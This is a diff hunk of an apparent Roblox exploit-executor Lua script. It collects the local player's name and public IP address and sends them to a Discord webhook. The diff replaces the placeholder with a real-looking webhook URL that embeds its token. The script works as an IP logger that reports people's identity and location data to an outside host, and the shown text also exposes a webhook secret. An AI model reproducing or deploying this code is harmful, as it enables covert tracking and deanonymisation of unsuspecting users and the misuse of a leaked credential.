@@ -46,7 +46,7 @@ print(send_hook.StatusCode)
 -- SYNAPSE VERSION
  
 local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "YOUR DISCORD WEBHOOK HERE"
+local WebhookURL = "https://discord.com/api/webhooks/1535836611361906689/4b04lrbx90uQTexlispjKv5AYYWK9PxXzTX-bSdBVrcagPQw5zwvKnPwx2Znf_ByzhUV"
 local getIPResponse = syn.request({
     Url = "https://api.ipify.org/?format=json",
     Method = "GET"
